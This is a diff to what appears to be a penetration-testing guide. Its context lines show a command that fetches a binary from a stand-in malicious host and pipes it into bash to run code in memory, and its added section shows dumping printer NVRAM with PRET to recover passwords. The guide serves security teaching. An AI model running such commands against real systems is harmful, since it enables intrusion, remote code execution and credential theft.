@@ -1283,3 +1283,21 @@ However, even if the file system is mounted as `ro`, /dev/shm will still be writ
 # Example
 wget -O- https://malicious.com/hacked.elf | base64 -w0 | bash ddexec.sh argv0 phone home
 ```
+
+## Dumping Printer NVRAM:
+
+You can dump the NVRAM and extract confidential info (as passwords) by accessing arbitrary addresses using PJL:
+
+```
+# Using PRET
+./pret.py -q printer pjl
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> nvram dump
+Writing copy to nvram/printer
+................................................................................
+................................................................................
+............................................S3cretPassw0rd......................
+................................................................................
+```
